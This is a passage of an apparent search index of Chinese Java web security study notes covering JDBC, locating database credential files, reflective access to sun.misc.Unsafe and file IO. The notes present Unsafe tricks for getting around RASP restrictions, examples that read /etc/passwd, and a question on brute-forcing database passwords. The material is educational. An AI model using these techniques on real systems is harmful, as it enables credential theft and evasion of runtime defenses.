\u7684\u63a5\u53e3\u7c7b\u8d1f\u8d23\u5b9e\u73b0\u5bf9\u6570\u636e\u5e93\u7684\u8fde\u63a5\uff0c\u6240\u6709\u7684\u6570\u636e\u5e93\u9a71\u52a8\u5305\u90fd\u5fc5\u987b\u5b9e\u73b0\u8fd9\u4e2a\u63a5\u53e3\u624d\u80fd\u591f\u5b8c\u6210\u6570\u636e\u5e93\u7684\u8fde\u63a5\u64cd\u4f5c\u3002 java.sql.DriverManager.getConnection(xx) \u5176\u5b9e\u5c31\u662f\u95f4\u63a5\u7684\u8c03\u7528\u4e86 java.sql.Driver \u7c7b\u7684 connect \u65b9\u6cd5\u5b9e\u73b0\u6570\u636e\u5e93\u8fde\u63a5\u7684\u3002\u6570\u636e\u5e93\u8fde\u63a5\u6210\u529f\u540e\u4f1a\u8fd4\u56de\u4e00\u4e2a\u53eb\u505a java.sql.Connection \u7684\u6570\u636e\u5e93\u8fde\u63a5\u5bf9\u8c61\uff0c\u4e00\u5207\u5bf9\u6570\u636e\u5e93\u7684\u67e5\u8be2\u64cd\u4f5c\u90fd\u5c06\u4f9d\u8d56\u4e8e\u8fd9\u4e2a Connection \u5bf9\u8c61 JDBC\u8fde\u63a5\u6570\u636e\u5e93\u7684\u4e00\u822c\u6b65\u9aa4 1. \u6ce8\u518c\u9a71\u52a8: Class.forName(\"\u6570\u636e\u5e93\u9a71\u52a8\u7684\u7c7b\u540d\") 2. \u83b7\u53d6\u8fde\u63a5: `DriverManager.getConnection(xxx ```java // JDBC\u8fde\u63a5\u6570\u636e\u5e93\u793a\u4f8b\u4ee3\u7801 String CLASS_NAME = \"com.mysql.jdbc.Driver\"; String URL = \"jdbc:mysql://localhost:3306/mysql\" String USERNAME = \"root\"; String PASSWORD = \"root\"; Class.forName(CLASS_NAME);// \u6ce8\u518cJDBC\u9a71\u52a8\u7c7b Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD); ```","title":"JDBC Connection"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JDBC/#\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f","text":"\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u5bfb\u627e\u65b9\u6cd5 \u4f20\u7edf\u7684Web\u5e94\u7528\u7684\u914d\u7f6e\u4fe1\u606f\u5b58\u653e\u8def\u5f84 - WEB-INF \u76ee\u5f55\u4e0b\u7684 *.properites .yml *.xml - Spring boot\u9879\u76ee: src/main/resources/ \u5e38\u89c1\u7684\u5b58\u50a8\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u7684\u6587\u4ef6\u8def\u5f84 - WEB-INF/applicationContext.xml - WEB-INF/hibernate.cfg.xml - WEB-INF/jdbc/jdbc.properties - \u4f7f\u7528\u7cfb\u7edf\u547d\u4ee4\u5bfb\u627e,\u5982\u5bfb\u627emysql: find \u8def\u5f84 -type f |xargs grep \"com.mysql.jdbc.Driver\" \u9700\u8981 Class.forName \u7684\u539f\u56e0: \u5728Driver\u7684static\u4e2d\u6ce8\u518c\u4e86\u9a71\u52a8\u5305 Class.forName(\"com.mysql.jdbc.Driver\") \u5b9e\u9645\u4e0a\u4f1a\u89e6\u53d1\u7c7b\u52a0\u8f7d\uff0c com.mysql.jdbc.Driver \u7c7b\u5c06\u4f1a\u88ab\u521d\u59cb\u5316\uff0c\u6240\u4ee5 static \u9759\u6001\u8bed\u53e5\u5757\u4e2d\u7684\u4ee3\u7801\u4e5f\u5c06\u4f1a\u88ab\u6267\u884c \u53cd\u5c04\u7c7b\u800c\u4e0d\u60f3\u89e6\u53d1\u7c7b\u9759\u6001\u4ee3\u7801\u5757\u7684\u9014\u5f84 - Class.forName(\"xxxx\", false, loader) - ClassLoader.load(\"xxxx\") Class.forName \u53ef\u4ee5\u7701\u53bb\u7684\u539f\u56e0 - \u5b9e\u9645\u4e0a\u8fd9\u91cc\u53c8\u5229\u7528\u4e86 Java \u7684\u4e00\u5927\u7279\u6027: Java SPI(Service Provider Interface) \uff0c\u56e0\u4e3a DriverManager \u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u4f1a\u8c03\u7528 java.util.ServiceLoader \u7c7b\u63d0\u4f9b\u7684SPI\u673a\u5236\uff0cJava\u4f1a\u81ea\u52a8\u626b\u63cfjar\u5305\u4e2d\u7684 META-INF/services \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u5e76\u4e14\u8fd8\u4f1a\u81ea\u52a8\u7684 Class.forName (\u6587\u4ef6\u4e2d\u5b9a\u4e49\u7684\u7c7b)","title":"\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JDBC/#\u603b\u7ed3","text":"\u8bfe\u540e\u601d\u8003 1. SPI\u673a\u5236 \u662f\u5426\u6709\u5b89\u5168\u6027\u95ee\u9898\uff1f 1. Java SPI\u5b89\u5168 2. Java-SPI\u673a\u5236\u4e0eSnakeYaml\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e 2. Java\u53cd\u5c04 \u6709\u54ea\u4e9b\u5b89\u5168\u95ee\u9898\uff1f java\u53cd\u5c04\u673a\u5236 1. Java\u7c7b\u52a0\u8f7d\u673a\u5236 \u662f\u4ec0\u4e48\uff1f 2. \u6570\u636e\u5e93\u8fde\u63a5\u65f6\u5bc6\u7801\u5b89\u5168\u95ee\u9898\uff1f 3. \u4f7f\u7528JDBC\u5982\u4f55\u5199\u4e00\u4e2a\u901a\u7528\u7684 \u6570\u636e\u5e93\u5bc6\u7801\u7206\u7834 \u6a21\u5757\uff1f","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/","tags":["java","java\u5b89\u5168"],"text":"Unsafe # sun.misc.Unsafe \u662fJava\u5e95\u5c42API( \u4ec5\u9650Java\u5185\u90e8\u4f7f\u7528,\u53cd\u5c04\u53ef\u8c03\u7528 )\u63d0\u4f9b\u7684\u4e00\u4e2a\u795e\u5947\u7684Java\u7c7b\uff0c Unsafe \u63d0\u4f9b\u4e86\u975e\u5e38\u5e95\u5c42\u7684 \u5185\u5b58\u3001CAS\u3001\u7ebf\u7a0b\u8c03\u5ea6\u3001\u7c7b\u3001\u5bf9\u8c61 \u7b49\u64cd\u4f5c\u3001 Unsafe \u6b63\u5982\u5b83\u7684\u540d\u5b57\u4e00\u6837\u5b83\u63d0\u4f9b\u7684\u51e0\u4e4e\u6240\u6709\u7684\u65b9\u6cd5\u90fd\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u672c\u8282\u53ea\u8bb2\u89e3\u5982\u4f55\u4f7f\u7528 Unsafe \u5b9a\u4e49Java\u7c7b\u3001\u521b\u5efa\u7c7b\u5b9e\u4f8b\u3002 \u7531\u4e8eUnsafe\u662f\u7981\u6b62\u5916\u90e8\u8c03\u7528\u7684,\u6211\u4eec\u53ef\u4ee5\u5148\u770b\u770bUnsafe\u7684\u4ee3\u7801\u7247\u6bb5,\u770b\u770b\u5982\u4f55\u901a\u8fc7\u53cd\u5c04\u83b7\u53d6Unsafe\u5b9e\u4f8b import sun.reflect.CallerSensitive ; import sun.reflect.Reflection ; public final class Unsafe { private static final Unsafe theUnsafe ; static { theUnsafe = new Unsafe (); \u7701\u53bb\u5176\u4ed6\u4ee3\u7801 ...... } private Unsafe () { } @CallerSensitive public static Unsafe getUnsafe () { Class var0 = Reflection . getCallerClass (); if ( var0 . getClassLoader () != null ) { throw new SecurityException ( \"Unsafe\" ); } else { return theUnsafe ; } } ... } \u83b7\u53d6Unsafe\u5b9e\u4f8b # \u6211\u4eec\u4ece\u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u67092\u79cd\u65b9\u5f0f\u83b7\u53d6Unsafe\u5b9e\u4f8b,\u4ee5\u4e0b\u5206\u522b\u4ecb\u7ecd\u4e0b\u8fd9\u4e24\u79cd\u65b9\u5f0f. \u8c03\u7528\u79c1\u6709\u6784\u9020\u65b9\u6cd5 # public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Constructor <?> declaredConstructor = unsafeClass . getDeclaredConstructor (); declaredConstructor . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) declaredConstructor . newInstance (); System . out . println ( unsafe ); } \u83b7\u53d6\u79c1\u6709\u5c5e\u6027theUnsafe # public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Field theUnsafe = unsafeClass . getDeclaredField ( \"theUnsafe\" ); theUnsafe . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) theUnsafe . get ( null ); System . out . println ( unsafe ); } allocateInstance\u65e0\u89c6\u6784\u9020\u65b9\u6cd5\u521b\u5efa\u7c7b\u5b9e\u4f8b # \u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2a\u53eb UnSafeTest \u7684\u7c7b\uff0c\u56e0\u4e3a\u67d0\u79cd\u539f\u56e0\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u53cd\u5c04\u7684\u65b9\u5f0f\u53bb\u521b\u5efa UnSafeTest \u7c7b\u5b9e\u4f8b\uff0c\u90a3\u4e48\u8fd9\u4e2a\u65f6\u5019\u4f7f\u7528 Unsafe \u7684 allocateInstance \u65b9\u6cd5\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\u4e86\u3002 package top.longlone ; import sun.misc.Unsafe ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; class UnsafeTest { private UnsafeTest () { System . out . println ( \"success\" ); }} public class UnsafeStudy { public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Field theUnsafe = unsafeClass . getDeclaredField ( \"theUnsafe\" ); theUnsafe . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) theUnsafe . get ( null ); UnsafeTest unsafeTest = ( UnsafeTest ) unsafe . allocateInstance ( UnsafeTest . class ); System . out . println ( unsafeTest ); }} Google\u7684 GSON \u5e93\u5728JSON\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c31\u4f7f\u7528\u8fd9\u4e2a\u65b9\u5f0f\u6765\u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\u4e5f\u4f1a\u7ecf\u5e38\u9047\u5230\u8fd9\u6837\u7684\u9650\u5236\uff0c\u6bd4\u5982RASP\u9650\u5236\u4e86 java.io.FileInputStream \u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u8bfb\u6587\u4ef6\u6216\u8005\u9650\u5236\u4e86 UNIXProcess/ProcessImpl \u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u6267\u884c\u672c\u5730\u547d\u4ee4\u7b49\u3002 defineClass\u76f4\u63a5\u8c03\u7528JVM\u521b\u5efa\u7c7b\u5bf9\u8c61 # package top.longlone ; import sun.misc.Unsafe ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; import java.lang.reflect.Method ; import java.security.CodeSource ; import java.security.ProtectionDomain ; import java.security.cert.Certificate ; import java.util.Base64 ; public class UnsafeStudy { private static final String TEST_CLASS_NAME = \"top.longlone.Hello\" ; private static final byte [] TEST_CLASS_BYTES = Base64 . getDecoder (). decode ( \"yv66vgAAADQAJAoABwARCgASABMJAAYAFAkAFQAWCgAXABgHABkHABoBAAZudW1iZXIBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAB2Rpc3BsYXkBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACgALBwAbDAAcAB0MAAgACQcAHgwAHwAgBwAhDAAiACMBABJ0b3AvbG9uZ2xvbmUvSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL0ludGVnZXIBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgAhAAYABwAAAAEAAgAIAAkAAAACAAEACgALAAEADAAAACkAAgABAAAADSq3AAEqBLgAArUAA7EAAAABAA0AAAAKAAIAAAADAAQABAABAA4ACwABAAwAAAAnAAIAAQAAAAuyAAQqtAADtgAFsQAAAAEADQAAAAoAAgAAAAYACgAHAAEADwAAAAIAEA==\" ); public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Field theUnsafe = unsafeClass . getDeclaredField ( \"theUnsafe\" ); theUnsafe . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) theUnsafe . get ( null ); // \u83b7\u53d6\u7cfb\u7edf\u7684\u7c7b\u52a0\u8f7d\u5668 ClassLoader classLoader = ClassLoader . getSystemClassLoader (); // \u521b\u5efa\u9ed8\u8ba4\u7684\u4fdd\u62a4\u57df ProtectionDomain domain = new ProtectionDomain ( new CodeSource ( null , ( Certificate [] ) null ), null , classLoader , null ); // \u76f4\u63a5\u8c03\u7528JVM\u521b\u5efa\u7c7b\u5bf9\u8c61 Class <?> helloClass = unsafe . defineClass ( TEST_CLASS_NAME , TEST_CLASS_BYTES , 0 , TEST_CLASS_BYTES . length , classLoader , domain ); Constructor <?> declaredConstructor = helloClass . getDeclaredConstructor (); declaredConstructor . setAccessible ( true ); Object o = declaredConstructor . newInstance (); Method displayMethod = helloClass . getDeclaredMethod ( \"display\" ); Object result = displayMethod . invoke ( o ); } }","title":"Unsafe"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/#unsafe","text":"sun.misc.Unsafe \u662fJava\u5e95\u5c42API( \u4ec5\u9650Java\u5185\u90e8\u4f7f\u7528,\u53cd\u5c04\u53ef\u8c03\u7528 )\u63d0\u4f9b\u7684\u4e00\u4e2a\u795e\u5947\u7684Java\u7c7b\uff0c Unsafe \u63d0\u4f9b\u4e86\u975e\u5e38\u5e95\u5c42\u7684 \u5185\u5b58\u3001CAS\u3001\u7ebf\u7a0b\u8c03\u5ea6\u3001\u7c7b\u3001\u5bf9\u8c61 \u7b49\u64cd\u4f5c\u3001 Unsafe \u6b63\u5982\u5b83\u7684\u540d\u5b57\u4e00\u6837\u5b83\u63d0\u4f9b\u7684\u51e0\u4e4e\u6240\u6709\u7684\u65b9\u6cd5\u90fd\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u672c\u8282\u53ea\u8bb2\u89e3\u5982\u4f55\u4f7f\u7528 Unsafe \u5b9a\u4e49Java\u7c7b\u3001\u521b\u5efa\u7c7b\u5b9e\u4f8b\u3002 \u7531\u4e8eUnsafe\u662f\u7981\u6b62\u5916\u90e8\u8c03\u7528\u7684,\u6211\u4eec\u53ef\u4ee5\u5148\u770b\u770bUnsafe\u7684\u4ee3\u7801\u7247\u6bb5,\u770b\u770b\u5982\u4f55\u901a\u8fc7\u53cd\u5c04\u83b7\u53d6Unsafe\u5b9e\u4f8b import sun.reflect.CallerSensitive ; import sun.reflect.Reflection ; public final class Unsafe { private static final Unsafe theUnsafe ; static { theUnsafe = new Unsafe (); \u7701\u53bb\u5176\u4ed6\u4ee3\u7801 ...... } private Unsafe () { } @CallerSensitive public static Unsafe getUnsafe () { Class var0 = Reflection . getCallerClass (); if ( var0 . getClassLoader () != null ) { throw new SecurityException ( \"Unsafe\" ); } else { return theUnsafe ; } } ... }","title":"Unsafe"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/#\u83b7\u53d6unsafe\u5b9e\u4f8b","text":"\u6211\u4eec\u4ece\u4e0a\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u67092\u79cd\u65b9\u5f0f\u83b7\u53d6Unsafe\u5b9e\u4f8b,\u4ee5\u4e0b\u5206\u522b\u4ecb\u7ecd\u4e0b\u8fd9\u4e24\u79cd\u65b9\u5f0f.","title":"\u83b7\u53d6Unsafe\u5b9e\u4f8b"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/#\u8c03\u7528\u79c1\u6709\u6784\u9020\u65b9\u6cd5","text":"public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Constructor <?> declaredConstructor = unsafeClass . getDeclaredConstructor (); declaredConstructor . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) declaredConstructor . newInstance (); System . out . println ( unsafe ); }","title":"\u8c03\u7528\u79c1\u6709\u6784\u9020\u65b9\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/#\u83b7\u53d6\u79c1\u6709\u5c5e\u6027theunsafe","text":"public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Field theUnsafe = unsafeClass . getDeclaredField ( \"theUnsafe\" ); theUnsafe . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) theUnsafe . get ( null ); System . out . println ( unsafe ); }","title":"\u83b7\u53d6\u79c1\u6709\u5c5e\u6027theUnsafe"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/#allocateinstance\u65e0\u89c6\u6784\u9020\u65b9\u6cd5\u521b\u5efa\u7c7b\u5b9e\u4f8b","text":"\u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2a\u53eb UnSafeTest \u7684\u7c7b\uff0c\u56e0\u4e3a\u67d0\u79cd\u539f\u56e0\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u901a\u8fc7\u53cd\u5c04\u7684\u65b9\u5f0f\u53bb\u521b\u5efa UnSafeTest \u7c7b\u5b9e\u4f8b\uff0c\u90a3\u4e48\u8fd9\u4e2a\u65f6\u5019\u4f7f\u7528 Unsafe \u7684 allocateInstance \u65b9\u6cd5\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u8fd9\u4e2a\u9650\u5236\u4e86\u3002 package top.longlone ; import sun.misc.Unsafe ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; class UnsafeTest { private UnsafeTest () { System . out . println ( \"success\" ); }} public class UnsafeStudy { public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Field theUnsafe = unsafeClass . getDeclaredField ( \"theUnsafe\" ); theUnsafe . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) theUnsafe . get ( null ); UnsafeTest unsafeTest = ( UnsafeTest ) unsafe . allocateInstance ( UnsafeTest . class ); System . out . println ( unsafeTest ); }} Google\u7684 GSON \u5e93\u5728JSON\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u5c31\u4f7f\u7528\u8fd9\u4e2a\u65b9\u5f0f\u6765\u521b\u5efa\u7c7b\u5b9e\u4f8b\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\u4e5f\u4f1a\u7ecf\u5e38\u9047\u5230\u8fd9\u6837\u7684\u9650\u5236\uff0c\u6bd4\u5982RASP\u9650\u5236\u4e86 java.io.FileInputStream \u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u8bfb\u6587\u4ef6\u6216\u8005\u9650\u5236\u4e86 UNIXProcess/ProcessImpl \u7c7b\u7684\u6784\u9020\u65b9\u6cd5\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u6267\u884c\u672c\u5730\u547d\u4ee4\u7b49\u3002","title":"allocateInstance\u65e0\u89c6\u6784\u9020\u65b9\u6cd5\u521b\u5efa\u7c7b\u5b9e\u4f8b"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/Unsafe/#defineclass\u76f4\u63a5\u8c03\u7528jvm\u521b\u5efa\u7c7b\u5bf9\u8c61","text":"package top.longlone ; import sun.misc.Unsafe ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; import java.lang.reflect.Method ; import java.security.CodeSource ; import java.security.ProtectionDomain ; import java.security.cert.Certificate ; import java.util.Base64 ; public class UnsafeStudy { private static final String TEST_CLASS_NAME = \"top.longlone.Hello\" ; private static final byte [] TEST_CLASS_BYTES = Base64 . getDecoder (). decode ( \"yv66vgAAADQAJAoABwARCgASABMJAAYAFAkAFQAWCgAXABgHABkHABoBAAZudW1iZXIBABNMamF2YS9sYW5nL0ludGVnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAB2Rpc3BsYXkBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACgALBwAbDAAcAB0MAAgACQcAHgwAHwAgBwAhDAAiACMBABJ0b3AvbG9uZ2xvbmUvSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL0ludGVnZXIBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgAhAAYABwAAAAEAAgAIAAkAAAACAAEACgALAAEADAAAACkAAgABAAAADSq3AAEqBLgAArUAA7EAAAABAA0AAAAKAAIAAAADAAQABAABAA4ACwABAAwAAAAnAAIAAQAAAAuyAAQqtAADtgAFsQAAAAEADQAAAAoAAgAAAAYACgAHAAEADwAAAAIAEA==\" ); public static void main ( String [] args ) throws Exception { Class <?> unsafeClass = Class . forName ( \"sun.misc.Unsafe\" ); Field theUnsafe = unsafeClass . getDeclaredField ( \"theUnsafe\" ); theUnsafe . setAccessible ( true ); Unsafe unsafe = ( Unsafe ) theUnsafe . get ( null ); // \u83b7\u53d6\u7cfb\u7edf\u7684\u7c7b\u52a0\u8f7d\u5668 ClassLoader classLoader = ClassLoader . getSystemClassLoader (); // \u521b\u5efa\u9ed8\u8ba4\u7684\u4fdd\u62a4\u57df ProtectionDomain domain = new ProtectionDomain ( new CodeSource ( null , ( Certificate [] ) null ), null , classLoader , null ); // \u76f4\u63a5\u8c03\u7528JVM\u521b\u5efa\u7c7b\u5bf9\u8c61 Class <?> helloClass = unsafe . defineClass ( TEST_CLASS_NAME , TEST_CLASS_BYTES , 0 , TEST_CLASS_BYTES . length , classLoader , domain ); Constructor <?> declaredConstructor = helloClass . getDeclaredConstructor (); declaredConstructor . setAccessible ( true ); Object o = declaredConstructor . newInstance (); Method displayMethod = helloClass . getDeclaredMethod ( \"display\" ); Object result = displayMethod . invoke ( o ); } }","title":"defineClass\u76f4\u63a5\u8c03\u7528JVM\u521b\u5efa\u7c7b\u5bf9\u8c61"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/java%20IO-NIO%E5%A4%9A%E7%A7%8D%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F/","tags":["java","java\u5b89\u5168"],"text":"java IO/NIO\u591a\u79cd\u8bfb\u5199\u6587\u4ef6\u65b9\u5f0f # \u6211\u4eec\u901a\u5e38\u8bfb\u5199\u6587\u4ef6\u90fd\u662f\u4f7f\u7528\u7684\u963b\u585e\u6a21\u5f0f\uff0c\u4e0e\u4e4b\u5bf9\u5e94\u7684\u4e5f\u5c31\u662f java.io.FileSystem \u3002 java.io.FileInputStream \u7c7b\u63d0\u4f9b\u4e86\u5bf9\u6587\u4ef6\u7684\u8bfb\u53d6\u529f\u80fd\uff0cjava\u7684\u5176\u4ed6\u8bfb\u53d6\u6587\u4ef6\u7684\u65b9\u6cd5\u57fa\u672c\u4e0a\u90fd\u662f\u5c01\u88c5\u4e86 java.io.FileInputStream \u7c7b\uff0c\u6bd4\u5982\uff1a java.io.FileReader \u3002 FileInputStream # FileInputStream\u8c03\u7528\u94fe java.io.FileInputStream.readBytes(FileInputStream.java:219) java.io.FileInputStream.read(FileInputStream.java:233) com.anbai.sec.filesystem.FileInputStreamDemo.main(FileInputStreamDemo.java:27) \u5176\u4e2dreadBytes\u662fnative\u65b9\u6cd5\uff0c\u6587\u4ef6\u7684\u6253\u5f00\u3001\u5173\u95ed\u7b49\u65b9\u6cd5\u4e5f\u90fd\u662fnative\u65b9\u6cd5 private native int readBytes(byte b[], int off, int len) throws IOException; private native void open0(String name) throws FileNotFoundException; private native int read0() throws IOException; private native long skip0(long n) throws IOException; private native int available0() throws IOException; private native void close0() throws IOException; FileInputStream \u8bfb\u53d6\u6587\u4ef6\u793a\u4f8b import java.io.ByteArrayOutputStream ; import java.io.File ; import java.io.FileInputStream ; public class Main { public static void main ( String [] args ) throws Exception { File file = new File ( \"/etc/passwd\" ); // \u6253\u5f00\u6587\u4ef6\u5bf9\u8c61\u5e76\u521b\u5efa\u6587\u4ef6\u8f93\u5165\u6d41 FileInputStream fis = new FileInputStream ( file ); // \u5b9a\u4e49\u6bcf\u6b21\u8f93\u5165\u6d41\u8bfb\u53d6\u5230\u7684\u5b57\u8282\u6570\u5bf9\u8c61 int a = 0 ; // \u5b9a\u4e49\u7f13\u51b2\u533a\u5927\u5c0f byte [] bytes = new byte [ 1024 ] ; // \u521b\u5efa\u4e8c\u8fdb\u5236\u8f93\u51fa\u6d41\u5bf9\u8c61 ByteArrayOutputStream out = new ByteArrayOutputStream (); // \u5faa\u73af\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9 while (( a = fis . read ( bytes )) != - 1 ) { // \u622a\u53d6\u7f13\u51b2\u533a\u6570\u7ec4\u4e2d\u7684\u5185\u5bb9\uff0c(bytes, 0, a)\u5176\u4e2d\u76840\u8868\u793a\u4ecebytes\u6570\u7ec4\u7684 // \u4e0b\u68070\u5f00\u59cb\u622a\u53d6\uff0ca\u8868\u793a\u8f93\u5165\u6d41read\u5230\u7684\u5b57\u8282\u6570\u3002 out . write ( bytes , 0 , a ); } System . out . println ( out . toString ()); } } FileOutputStream # FileOutputStream \u5199\u6587\u4ef6\u793a\u4f8b import java.io.IOException ; import java.io.File ; import java.io.FileOutputStream ; public class FileOutputStreamDemo { public static void main ( String [] args ) throws IOException { // \u5b9a\u4e49\u5199\u5165\u6587\u4ef6\u8def\u5f84 File file = new File ( \"/tmp/1.txt\" ); // \u5b9a\u4e49\u5f85\u5199\u5165\u6587\u4ef6\u5185\u5bb9 String content = \"Hello World.\" ; // \u521b\u5efaFileOutputStream\u5bf9\u8c61 FileOutputStream fos = new FileOutputStream ( file ); // \u5199\u5165\u5185\u5bb9\u4e8c\u8fdb\u5236\u5230\u6587\u4ef6 fos . write ( content . getBytes ()); fos . flush (); fos . close (); } } RandomAccessFile # Java\u63d0\u4f9b\u4e86\u4e00\u4e2a\u975e\u5e38\u6709\u8da3\u7684\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u7684\u7c7b: java.io.RandomAccessFile ,\u8fd9\u4e2a\u7c7b\u540d\u5b57\u9762\u610f\u601d\u662f\u4efb\u610f\u6587\u4ef6\u5185\u5bb9\u8bbf\u95ee\uff0c\u7279\u522b\u4e4b\u5904\u662f\u8fd9\u4e2a\u7c7b\u4e0d\u4ec5\u53ef\u4ee5\u50cf java.io.FileInputStream \u4e00\u6837\u8bfb\u53d6\u6587\u4ef6\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u50cf java.io.FileOutputStream \u5199\u6587\u4ef6 // RandomAccessFile \u8bfb\u53d6\u6587\u4ef6\u793a\u4f8b import java.io.* ; public class Main { public static void main ( String [] args ) throws Exception { File file = new File ( \"/etc/passwd\" ); try { // \u521b\u5efaRandomAccessFile\u5bf9\u8c61,r\u8868\u793a\u4ee5\u53ea\u8bfb\u6a21\u5f0f\u6253\u5f00\u6587\u4ef6\uff0c\u4e00\u5171\u6709:r(\u53ea\u8bfb)\u3001rw(\u8bfb\u5199)\u3001 // rws(\u8bfb\u5199\u5185\u5bb9\u540c\u6b65)\u3001rwd(\u8bfb\u5199\u5185\u5bb9\u6216\u5143\u6570\u636e\u540c\u6b65)\u56db\u79cd\u6a21\u5f0f\u3002 RandomAccessFile raf = new RandomAccessFile ( file , \"r\" ); // \u5b9a\u4e49\u6bcf\u6b21\u8f93\u5165\u6d41\u8bfb\u53d6\u5230\u7684\u5b57\u8282\u6570\u5bf9\u8c61 int a = 0 ; // \u5b9a\u4e49\u7f13\u51b2\u533a\u5927\u5c0f byte [] bytes = new byte [ 1024 ] ; // 